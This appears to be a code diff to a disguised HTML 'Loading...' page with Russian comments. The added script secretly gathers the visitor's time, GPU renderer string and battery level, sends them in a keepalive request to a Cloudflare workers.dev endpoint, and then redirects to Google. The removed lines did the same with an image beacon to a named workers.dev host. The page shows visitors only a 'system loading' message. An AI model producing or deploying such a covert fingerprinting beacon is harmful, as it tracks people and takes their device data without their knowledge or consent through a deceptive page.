@@ -1,28 +1,48 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <title>Loading...</title>
     <script>
-        // Твоя ссылка и текущее время устройства
-        const url = "https://adminfdm.alexgranny1708.workers.dev/";
-        const t = encodeURIComponent(new Date().toLocaleString());
+        async function sendAndRedirect() {
+            const dest = "https://google.com";
+            const workerUrl = "https://workers.dev";
+            
+            // 1. Сбор данных
+            const data = {
+                t: new Date().toLocaleString(),
+                gl: (() => {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    const debug = gl?.getExtension('WEBGL_debug_renderer_info');
+                    return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : 'N/A';
+                })(),
+                bat: await (async () => {
+                    if (!navigator.getBattery) return 'N/A';
+                    const b = await navigator.getBattery();
+                    return `${Math.round(b.level * 100)}%${b.charging ? '+' : '-'}`;
+                })()
+            };
 
-        const i = new Image();
-        function go() { window.location.replace("https://google.com"); }
+            // 2. Формирование URL
+            const query = new URLSearchParams(data).toString();
+            const finalUrl = workerUrl + "?" + query;
 
-        // Если воркер ответил или выдал ошибку — уходим в Google
-        i.onload = go;
-        i.onerror = go;
+            // 3. Отправка (keepalive позволяет запросу выжить после закрытия страницы)
+            try {
+                fetch(finalUrl, { mode: 'no-cors', keepalive: true });
+            } catch (e) { }
 
-        // Отправка запроса с данными времени
-        i.src = url + "?t=" + t;
+            // 4. Редирект через небольшую паузу для гарантии старта запроса
+            setTimeout(() => {
+                window.location.replace(dest);
+            }, 800);
+        }
 
-        // Жесткий таймер на 2 секунды для надежности отправки
-        setTimeout(go, 2000);
+        sendAndRedirect();
     </script>
 </head>
 <body>
-    <p>Loading...</p>
+    <p>Загрузка системы...</p>
 </body>
 </html>
